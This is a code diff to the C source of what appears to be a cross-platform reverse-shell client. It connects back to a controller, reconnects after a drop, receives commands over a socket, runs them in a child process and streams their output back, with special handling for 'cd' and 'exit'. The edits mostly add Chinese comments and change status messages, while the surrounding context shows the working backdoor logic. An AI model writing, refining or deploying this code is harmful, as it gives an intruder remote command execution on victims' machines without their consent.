@@ -133,10 +133,11 @@ void execute_no_timeout(int sock, char* raw_cmd) {
     CloseHandle(hChildStd_OUT_Rd);
 
 #else
-    // ================= Linux 平台：防死锁、防断连僵尸 =================
+    // ================= Linux/Macos/BSD 平台：防死锁、防断连僵尸 =================
     int pipefd[2];
     if (pipe(pipefd) < 0) return;
 
+    // 创建子进程
     pid_t pid = fork();
     if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return; }
 
@@ -160,6 +161,7 @@ void execute_no_timeout(int sock, char* raw_cmd) {
     int flags = fcntl(pipefd[0], F_GETFL, 0);
     fcntl(pipefd[0], F_SETFL, flags | O_NONBLOCK);
 
+    // 监听最大描述符
     char buffer[BUF_SIZE];
     while (1) {
         fd_set read_fds;
@@ -167,10 +169,11 @@ void execute_no_timeout(int sock, char* raw_cmd) {
         tv.tv_sec = 0;
         tv.tv_usec = 100000; // 0.1 秒超时
         
-        FD_ZERO(&read_fds);
-        FD_SET(pipefd[0], &read_fds); // 监听管道回显
-        FD_SET(sock, &read_fds);       // 监听 Socket 死活
+        FD_ZERO(&read_fds);             // 清空读描述符集
+        FD_SET(pipefd[0], &read_fds);   // 监听管道回显
+        FD_SET(sock, &read_fds);        // 监听 Socket 死活
 
+        // 监听最大描述符
         int max_fd = (pipefd[0] > sock) ? pipefd[0] : sock;
         int select_res = select(max_fd + 1, &read_fds, NULL, NULL, &tv);
 
@@ -225,6 +228,7 @@ int main(int argc, char *argv[]) {
     signal(SIGPIPE, SIG_IGN);  
 #endif
 
+// 初始化Winsock
 #ifdef _WIN32
     WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
 #endif
@@ -251,16 +255,16 @@ int main(int argc, char *argv[]) {
 #endif
         }
         
-        send(s, "[+] 状态流模式已开启。已成功防断线，支持自动重连！\n", 48, 0);
+        send(s, "[+] Connected successfully.\n", 27, 0);
 
         while (1) {
             getcwd(path, sizeof(path));
+
             #ifdef _WIN32
             // 获取当前程序的文件名
             const char* Program_name = basename(__argv[0]);
             #else
             const char* Program_name = basename(argv[0]);
-
             #endif
 
             // 获取当前的日期和时间
@@ -277,6 +281,7 @@ int main(int argc, char *argv[]) {
                 break; 
             }
 
+            // 接收控制端的命令
             memset(buf, 0, BUF_SIZE);
             int len = (int)recv(s, buf, BUF_SIZE - 1, 0);
             if (len <= 0) break; // 控制端掐断，立刻触发重连
@@ -285,7 +290,7 @@ int main(int argc, char *argv[]) {
             if (strlen(buf) == 0) continue;
             
             if (strcmp(buf, "exit") == 0) {
-                send(s, "[-] Logout\n", 11, 0);
+                send(s, "[-] Logout.\n", 12, 0);
 #ifdef _WIN32
                 closesocket(s); WSACleanup();
 #else
@@ -294,6 +299,7 @@ int main(int argc, char *argv[]) {
                 return 0;
             }
 
+            // 处理cd命令
             if (strncmp(buf, "cd ", 3) == 0) {
                 chdir(buf + 3);
                 continue;
@@ -302,6 +308,7 @@ int main(int argc, char *argv[]) {
             execute_no_timeout(s, buf);
         }
 
+// 关闭连接
 #ifdef _WIN32
         closesocket(s); Sleep(2000);  
 #else
@@ -309,6 +316,7 @@ int main(int argc, char *argv[]) {
 #endif
     }  
 
+// 清理Winsock
 #ifdef _WIN32
     WSACleanup();
 #endif
